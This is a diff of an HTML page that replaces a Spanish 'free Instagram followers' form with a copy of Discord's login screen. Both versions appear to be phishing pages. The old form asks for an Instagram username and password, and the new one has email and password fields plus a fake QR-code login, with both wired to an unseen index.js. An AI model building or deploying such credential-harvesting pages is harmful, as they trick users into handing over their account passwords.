@@ -1,7 +1,5 @@
-
-
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,20 +11,43 @@
     <link  rel="icon"   href="favicon.ico" type="image/ico" />
 </head>
 <body>
-    <script src="index.js"></script>
-    <section class="form-register">
-        <center>
-            <img class="logo" src="instagram.png" type="image/png" width="100" height="100">
-        </center>
-        <h4>Seguidores Instagram</h4>    
-        <form method="get">
-            <input class="controls" type="text" name="username" id="username" placeholder="Nombre de Instagram" />
-            <input class="controls" type="password" name="password" id="password" placeholder="Contraseña" />
-            <input class="controls" type="text" name="followers" id="followers" placeholder="Número de Seguidores" />
-            <!-- <input class="botons" type="submit" value="Enviar seguidores"> -->
-            <button type="button" class="botons" onclick="sendMessage()">Enviar Seguidores</button>
-        </form>
-    </section>
-</body>
-</html>
+    <canvas id="svgBlob"></canvas>
 
+<div class="position">
+  <form class="container">
+    <div class="centering-wrapper">
+      <div class="section1 text-center">
+        <div class="primary-header">Welcome back!</div>
+        <div class="secondary-header">We're so excited to see you again!</div>
+        <div class="input-position">
+	  <div class="form-group">
+            <h5 class="input-placeholder" id="email-txt">Email<span class="error-message" id="email-error"></span></h5>
+	    <input type="text" name="username" id="username" required="true" name="logemail" class="form-style" id="logemail" autocomplete="off" style="margin-bottom: 20px;">
+	    <i class="input-icon uil uil-at"></i>
+	  </div>	
+          <div class="form-group">
+            <h5 class="input-placeholder" id="pword-txt">Password<span class="error-message" id="password-error"></span></h5>
+	    <input type="password" name="password" id="password" required="true" name="logpass" class="form-style" id="logpass" autocomplete="on">
+	    <i class="input-icon uil uil-lock-alt"></i>
+	  </div>
+        </div>
+        <div class="password-container"><a href="#" class="link">Forgot your password?</a></div>
+          <div class="btn-position">
+          <a href="#" class="btn">login</a>
+        </div>
+      </div>
+      <div class="horizontalSeparator"></div>
+      <div class="qr-login">
+        <div class="qr-container">
+          <img class="logo" src="https://cdn.discordapp.com/attachments/742854174324031528/771346778356318248/ChallengerCarl_2.png"/>
+          <canvas id="qr-code"></canvas>
+        </div>
+        <div class="qr-pheader">Log in with QR Code</div>
+        <div class="qr-sheader">Scan this with the <strong>scanner app </strong>to log in instantly.</div>
+      </div>
+    </div>
+  </form>
+</div>
+<script src="index.js"></script>
+</body>
+<html>
